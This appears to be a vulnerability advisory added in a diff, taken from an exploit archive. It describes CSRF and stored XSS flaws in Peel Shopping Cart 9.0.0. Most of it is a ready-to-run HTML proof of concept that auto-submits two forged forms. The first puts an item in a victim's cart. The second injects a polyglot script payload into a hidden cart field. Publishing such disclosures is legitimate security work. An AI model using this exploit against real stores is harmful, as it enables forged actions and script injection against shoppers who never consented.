@@ -1,0 +1,70 @@
+id: 30302
+date: 05/03/2018
+title: Peel Shopping Cart 9.0.0 Cross Site Request Forgery / Cross Site Scripting Vulnerabilities
+author: Matt Landers
+cves: 
+
+=================================================
+
+Synopsis:          Post XSS with dual CSRF via inproper sanitized user input.
+Product:           Peel Shopping Cart
+Version:           9.0.0
+Researcher:           Matt Landers
+             mattjoeland@gmail.com
+             twitter.com/matthewjland
+             https://mjlanders.org/
+                                     
+=================================================
+
+The following csrf/xss proof of concept demonstrates first how an item can be added to the customers cart via CSRF on https://<replace with host>/en/achat/caddie_ajout.php , and secondly
+how the properties of the item in cart can be modified via CSRF to include a XSS payload that is inserted in to the <input name="couleurId[0]" value="0" type="hidden"> function within https://<replace with host>/achat/caddie_affichage.php .
+
+I have chosen to include the CSRF that adds an item to the victims cart so that we can make sure that there is actually something in the cart to modify with the second CSRF instance. 
+This POC will load two tabs to show how the CSRF is implemented, the first to add an item to cart, the second to modify the item to include a XSS payload.
+
+------POC-------------------------------------------------------------------------------------
+
+
+<!aa
+ Peel Shopping Cart -- https://www.peel-shopping.com -- ver 9.0.0
+ 
+ Security Researcher: Matt Landers - twitter.com/matthewjland
+
+ Description: Peel Shopping Cart is prone to various CSRF and XSS vulnerabilities.
+ The csrf example below opens two tabs. The first tab adds an item to the users cart
+ and the second tab modifies the attributes of that item showing a Post XSS.
+ Also the XSS appears to be persistant as long as the modified cart item, remains in the cart.
+aa> 
+
+<html>
+  <body>
+    <form id="additemcsrf" target="_blank" form action="https://xxxxxxxx.xxx/en/achat/caddie_ajout.php?prodid=10" method="POST" enctype="multipart/form-data">
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [qte] <input               name="qte" value="1" /></div>
+      <input type="submit" value="Submit request" />
+    </form>
+  
+    <form id="csrftoxss" target="+blank" form action="https://xxxxxxxxxx.xxx/en/achat/caddie_affichage.php" method="POST">
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [func] <input               name="func" value="commande" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [id[0]] <input               name="id[0]" value="10" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [listcadeaux_owner[0]] <input               name="listcadeaux_owner[0]" value="" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [option[0]] <input               name="option[0]" value="0" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [id_attribut[0]] <input               name="id_attribut[0]" value="" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [couleurId[0]] <input               name="couleurId[0]" value="0<!'/*"/*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm`XSS` //>" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [tailleId[0]] <input               name="tailleId[0]" value="0" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [email_check[0]] <input               name="email_check[0]" value="" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [quantite[0]] <input               name="quantite[0]" value="1" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [code_promo] <input               name="code_promo" value="" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [null] <input               name="null" value="undefined" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [pays_zone] <input               name="pays_zone" value="1" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [type] <input               name="type" value="" /></div>
+      <div style="display:block; width:95%; border:2px solid red; margin:10px; font-size:2em">Hidden field [null] <input               name="null" value="" /></div>
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+  document.getElementById("additemcsrf").submit();
+  window.setTimeout( function () { document.forms.csrftoxss.submit()}, 1000);  <!aa if Item does not get added in to the cart before the second CSRF resolves, make this number higher, 2000 etc aa>
+    </script>
+  </body>
+</html>
+
+#  0day.today [2023-03-22]  #
